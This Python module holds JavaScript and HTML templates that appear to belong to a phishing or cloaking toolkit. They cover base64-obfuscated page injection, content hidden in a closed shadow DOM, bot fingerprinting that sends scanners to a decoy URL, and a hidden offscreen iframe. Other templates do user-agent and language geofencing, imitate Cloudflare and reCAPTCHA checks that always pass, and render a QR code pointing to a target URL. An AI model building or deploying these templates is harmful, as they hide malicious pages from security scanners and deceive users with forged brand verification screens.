"""
Pre-written JavaScript snippets used by various techniques.
All placeholders are in {curly_brace} format for .format() substitution.
"""

DYNAMIC_DOM_TEMPLATE = """\
(function(){{
  var _b = atob('{b64_body}');
  document.addEventListener('DOMContentLoaded', function(){{
    document.body.innerHTML = _b;
    [].slice.call(document.body.querySelectorAll('script')).forEach(function(s){{
      var n = document.createElement('script');
      [].slice.call(s.attributes).forEach(function(a){{n.setAttribute(a.name,a.value);}});
      n.textContent = s.textContent;
      s.parentNode.replaceChild(n, s);
    }});
  }});
}})();"""

SHADOW_DOM_TEMPLATE = """\
(function() {{
  document.addEventListener('DOMContentLoaded', function() {{
    var host = document.getElementById('__shadow_host__');
    if (!host) return;
    var shadow = host.attachShadow({{mode: 'closed'}});
    shadow.innerHTML = atob('{b64_content}');
  }});
}})();"""

ANTIBOT_FINGERPRINT_TEMPLATE = """\
(function() {{
  function _fp() {{
    var score = 0;
    // Canvas fingerprint
    try {{
      var c = document.createElement('canvas');
      var ctx = c.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillText('fp_test', 2, 2);
      if (c.toDataURL().length > 100) score += 1;
    }} catch(e) {{}}
    // WebGL check
    try {{
      var gl = document.createElement('canvas').getContext('webgl');
      if (gl && gl.getParameter(gl.RENDERER)) score += 1;
    }} catch(e) {{}}
    // Screen resolution (bots often use 800x600 or 1024x768)
    if (window.screen.width > 1024 && window.screen.height > 768) score += 1;
    // Mouse movement (bots often don't move mouse)
    var mouseMoved = false;
    document.addEventListener('mousemove', function() {{ mouseMoved = true; }}, {{once: true}});
    setTimeout(function() {{
      if (score < 2 || !mouseMoved) {{
        var botUrl = '{bot_redirect_url}';
        if (botUrl) window.location.href = botUrl;
        else document.body.innerHTML = '';
      }}
    }}, {check_delay_ms});
  }}
  _fp();
}})();"""

HIDDEN_IFRAME_TEMPLATE = """\
<iframe src="{iframe_src}" style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;border:0;" tabindex="-1" aria-hidden="true" id="__ghost_frame__"></iframe>"""

GEOFENCE_UA_TEMPLATE = """\
(function() {{
  var blocked_uas = {blocked_ua_json};
  var ua = navigator.userAgent.toLowerCase();
  for (var i = 0; i < blocked_uas.length; i++) {{
    if (ua.indexOf(blocked_uas[i].toLowerCase()) !== -1) {{
      document.body.innerHTML = '<p>Access denied.</p>';
      return;
    }}
  }}
}})();"""

GEOFENCE_COMBINED_TEMPLATE = """\
(function() {{
  var blocked_uas = {blocked_ua_json};
  var allowed_langs = {allowed_langs_json};
  var ua = navigator.userAgent.toLowerCase();
  var lang = (navigator.language || navigator.userLanguage || '').toLowerCase();
  for (var i = 0; i < blocked_uas.length; i++) {{
    if (ua.indexOf(blocked_uas[i].toLowerCase()) !== -1) {{
      document.body.innerHTML = '';
      return;
    }}
  }}
  var langOk = allowed_langs.length === 0;
  for (var j = 0; j < allowed_langs.length; j++) {{
    if (lang.indexOf(allowed_langs[j].toLowerCase()) !== -1) {{ langOk = true; break; }}
  }}
  if (!langOk) {{ document.body.innerHTML = ''; }}
}})();"""

FAKE_CLOUDFLARE_CSS = """\
#__cf_overlay__{
  position:fixed;inset:0;z-index:2147483647;
  background:#fff;display:flex;flex-direction:column;
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;
  -webkit-font-smoothing:antialiased;color:#1d1d1f;
  transition:opacity 0.45s ease;
}
#__cf_main__{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px;}
#__cf_card__{text-align:center;width:100%;max-width:500px;}
#__cf_logo_row__{
  display:flex;align-items:center;justify-content:center;gap:10px;
  margin-bottom:36px;
}
#__cf_logo_row__ svg{width:32px;height:32px;}
#__cf_brand_name__{font-size:22px;font-weight:600;color:#1d1d1f;letter-spacing:-.3px;}
#__cf_headline__{
  font-size:28px;font-weight:300;color:#1d1d1f;
  margin-bottom:28px;letter-spacing:-.5px;
}
#__cf_progress__{
  width:48px;height:48px;margin:0 auto 28px;position:relative;
}
#__cf_spinner__{
  width:48px;height:48px;border-radius:50%;
  border:3px solid #e5e5e5;border-top-color:#f6821f;
  animation:__cf_rot__ .8s linear infinite;
}
@keyframes __cf_rot__{to{transform:rotate(360deg);}}
#__cf_tick__{
  display:none;font-size:32px;color:#f6821f;line-height:1;
}
#__cf_status__{font-size:15px;color:#444;line-height:1.7;margin-bottom:6px;}
#__cf_sub__{font-size:13px;color:#888;line-height:1.6;}
#__cf_footer__{
  border-top:1px solid #ebebeb;background:#fafafa;
  padding:12px 24px;display:flex;justify-content:space-between;
  align-items:center;flex-wrap:wrap;gap:8px;font-size:11.5px;color:#6b6b6b;
}
#__cf_footer__ b{color:#404040;}
#__cf_ray__{font-family:'SF Mono','Fira Code',monospace;font-size:11px;letter-spacing:.04em;}"""

FAKE_CLOUDFLARE_HTML = """\
<div id="__cf_overlay__" dir="{dir_attr}">
  <div id="__cf_main__">
    <div id="__cf_card__">
      <div id="__cf_logo_row__">
        <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M46 40H17a10 10 0 0 1-1-20 13 13 0 0 1 25-2 9 9 0 0 1 9 9 9 9 0 0 1-4 13z" fill="#f6821f"/>
          <path d="M46 40H17a10 10 0 0 1 0-20h.4A13 13 0 0 1 42 18.4 9 9 0 0 1 50 29a9 9 0 0 1-4 11z" fill="#fbad41" opacity=".55"/>
        </svg>
        <span id="__cf_brand_name__">{brand}</span>
      </div>
      <div id="__cf_headline__">{headline}</div>
      <div id="__cf_progress__">
        <div id="__cf_spinner__"></div>
        <div id="__cf_tick__">&#10003;</div>
      </div>
      <div id="__cf_status__">{checking}</div>
      <div id="__cf_sub__">{subtext}</div>
    </div>
  </div>
  <div id="__cf_footer__">
    <span>{footer_left}</span>
    <span id="__cf_ray__">{footer_right}</span>
  </div>
</div>
<script>
(function(){{
  setTimeout(function(){{
    var sp=document.getElementById('__cf_spinner__');
    var tk=document.getElementById('__cf_tick__');
    var st=document.getElementById('__cf_status__');
    var sb=document.getElementById('__cf_sub__');
    if(sp)sp.style.display='none';
    if(tk){{tk.style.display='block';}}
    if(st)st.innerHTML='Verification successful';
    if(sb)sb.textContent='Redirecting\u2026';
    setTimeout(function(){{
      var o=document.getElementById('__cf_overlay__');
      if(o){{
        o.style.opacity='0';
        setTimeout(function(){{o.style.display='none';}},460);
      }}
    }},900);
  }},2800);
}})();
</script>"""

FAKE_RECAPTCHA_CSS = """\
#__rc_overlay__ {
  position:fixed;top:0;left:0;width:100%;height:100%;
  background:rgba(0,0,0,.55);z-index:99999;
  display:flex;align-items:center;justify-content:center;
  transition:opacity 0.45s ease;
}
#__rc_box__ {
  background:#fff;border-radius:4px;padding:24px 28px;
  box-shadow:0 4px 24px rgba(0,0,0,.3);font-family:Roboto,Arial,sans-serif;
  min-width:300px;
}
#__rc_title__ { font-size:18px;font-weight:500;margin-bottom:16px;color:#202124; }
#__rc_check_row__ { display:flex;align-items:center;gap:12px;margin-bottom:16px; }
#__rc_checkbox__ {
  width:28px;height:28px;border:2px solid #c9c9c9;border-radius:2px;
  cursor:pointer;display:flex;align-items:center;justify-content:center;
  font-size:18px;flex-shrink:0;
}
#__rc_label__ { font-size:14px;color:#555; }
#__rc_badge__ { font-size:10px;color:#aaa;text-align:right; }"""

FAKE_RECAPTCHA_HTML = """\
<div id="__rc_overlay__" dir="{dir_attr}">
  <div id="__rc_box__">
    <div id="__rc_title__">{title}</div>
    <div id="__rc_check_row__">
      <div id="__rc_checkbox__" onclick="__rcVerify(this)">&#9633;</div>
      <label id="__rc_label__">{checkbox_label}</label>
    </div>
    <div id="__rc_badge__">{brand}</div>
  </div>
</div>
<script>
function __rcVerify(el) {
  if (el.dataset.used) return;
  el.dataset.used = '1';
  el.innerHTML = '&#10003;';
  el.style.background = '#4285f4';
  el.style.color = '#fff';
  el.style.borderColor = '#4285f4';
  var lbl = document.getElementById('__rc_label__');
  if (lbl) lbl.textContent = 'Verification successful';
  setTimeout(function(){
    var o = document.getElementById('__rc_overlay__');
    if (o) {
      o.style.opacity = '0';
      setTimeout(function(){ o.style.display = 'none'; }, 460);
    }
  }, 900);
}
</script>"""

BLOB_QR_TEMPLATE = """\
(function(){{
  var url = '{target_url}';
  var size = 200;
  var c = document.createElement('canvas');
  c.width = size; c.height = size;
  var ctx = c.getContext('2d');
  // Simple placeholder pattern — in production use a QR library loaded locally
  ctx.fillStyle='#fff'; ctx.fillRect(0,0,size,size);
  ctx.fillStyle='#000';
  var cells = 25;
  var cell = size / cells;
  // Draw finder patterns
  [[0,0],[0,cells-7],[cells-7,0]].forEach(function(p){{
    ctx.fillRect(p[0]*cell,p[1]*cell,7*cell,7*cell);
    ctx.fillStyle='#fff';
    ctx.fillRect((p[0]+1)*cell,(p[1]+1)*cell,5*cell,5*cell);
    ctx.fillStyle='#000';
    ctx.fillRect((p[0]+2)*cell,(p[1]+2)*cell,3*cell,3*cell);
    ctx.fillStyle='#000';
  }});
  c.toBlob(function(blob){{
    var blobUrl = URL.createObjectURL(blob);
    var img = document.createElement('img');
    img.src = blobUrl;
    img.alt = 'Scan to continue';
    img.title = url;
    img.style.cssText='display:block;margin:16px auto;border:1px solid #ccc;';
    var cont = document.getElementById('__blob_qr_container__');
    if (cont) cont.appendChild(img);
  }});
}})();"""
